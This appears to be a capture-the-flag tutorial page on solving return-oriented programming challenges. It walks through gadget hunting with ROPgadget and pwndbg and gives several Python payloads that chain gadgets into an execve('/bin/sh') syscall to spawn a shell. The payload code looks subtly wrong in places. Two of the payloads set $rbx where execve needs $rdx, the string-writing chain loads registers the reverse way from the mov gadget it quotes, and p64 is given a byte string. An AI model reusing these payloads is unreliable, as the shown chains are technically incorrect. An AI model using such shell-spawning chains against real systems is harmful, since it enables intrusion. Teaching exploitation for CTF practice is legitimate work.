---
title: How to solve a ROP challenge
---
import {LinkCard} from "@astrojs/starlight/components";

This guide shows you how to solve a ROP challenge.

## Identify available gadgets
The available gadgets in a program usually determines what subcategory of ROP attack you might need to use.

Check for gadgets using `ROPgadget --binary ./vuln | grep "<register>"`
- If there are no easy-to-use `$rax` or `syscall` gadgets, ROP attacks may not be the correct type of attack.
- If there are no easy-to-use `$rdi`, `$rsi` and `$rdx` gadgets, visit the following guides for a more advanced ROP attack.
    - (insert guide here)

## Locating `/bin/sh`
It is possible that `/bin/sh` may already exist as a string in your program. Run `strings ./vuln | grep "/bin/sh"` to check.

If such string exists, skip to [finding the offset to return address](#find-offset-to-return-address)

## Locate empty space for `/bin/sh`
If there is no `/bin/sh` string, you will need to add the string yourself to empty address.

To begin, first find some empty space within the program's address space.
1. Open the program with pwndbg.
2. Ensure that the program pauses as it runs, either through a user input or breakpoint you added.
3. Run the program and `CTRL+C` when you are at the pause
4. Run `vmmap`. Identify the address where the `DATA` "region" starts.
5. View the data region with `x/<number of bytes>x <address>` to view some amount of bytes from the target address onwards, inclusive of the target address.
6. Note down the address you want to add `/bin/sh` into. It should be empty `0x00000000` such that you would not interfere with the program.

![](/src/assets/pwn/guides/rop/vmmap.png)

## Identify "mov" gadget
Afterward, identify a `mov` gadget that you will use.

For example, the gadget `mov qword ptr [rax], rdi; ret` would move the value from `$rdi` to the address at `$rax`.

Note down the address of the `mov` gadget you will use.

## Build payload
You will need to do the following in your payload in no particular order:
1. Set the register that should hold the value to the value
    1. Ensure that the `/bin/sh` string contains the null byte like a string should have.
2. Set the register that should hold the address to the address

Finally, call the `mov` gadget via the address you noted down. Here is an example payload:
```python
payload = b"A"*64
payload += p64(rop.rax.address)
payload += p64(b"/bin/sh\x00")
payload += p64(rop.rdi.address)
payload += p64(BINSH)
payload += p64(MOV_GADGET) # mov qword ptr [rax], rdi; ret
```

## Find offset to return address

Find the offset from your buffer to the return address.

<LinkCard title="Finding offsets to return addresses" href="/pwn/guides/cyclic/" description="Guide to finding offset from a buffer to the return address"/>

## Build payload
You will need to do the following in your payload in no particular order:
- Set `$rax` to `59`/`0x3b`
- Set `$rdi` to the address of a `/bin/sh` string
- Set `$rsi` to `0`/`0x0`
- Set `$rbx` to `0`/`0x0`

Finally, call a `syscall` gadget. Here is an example payload:
```python
payload = b"A"*64
payload += p64(rop.rax.address)
payload += p64(0x3b)
payload += p64(rop.rdi.address)
payload += p64(BINSH)
payload += p64(rop.rsi.address)
payload += p64(0x0)
payload += p64(rop.rbx.address)
payload += p64(0x0)
payload += p64(rop.syscall.address)
```

Here ie an example payload that includes adding the `/bin/sh` string:
```python
payload = b"A"*64
payload += p64(rop.rax.address)
payload += p64(b"/bin/sh\x00")
payload += p64(rop.rdi.address)
payload += p64(BINSH)
payload += p64(MOV_GADGET) # mov qword ptr [rax], rdi; ret

payload += p64(rop.rax.address)
payload += p64(0x3b)
payload += p64(rop.rdi.address)
payload += p64(BINSH)
payload += p64(rop.rsi.address)
payload += p64(0x0)
payload += p64(rop.rbx.address)
payload += p64(0x0)
payload += p64(rop.syscall.address)
```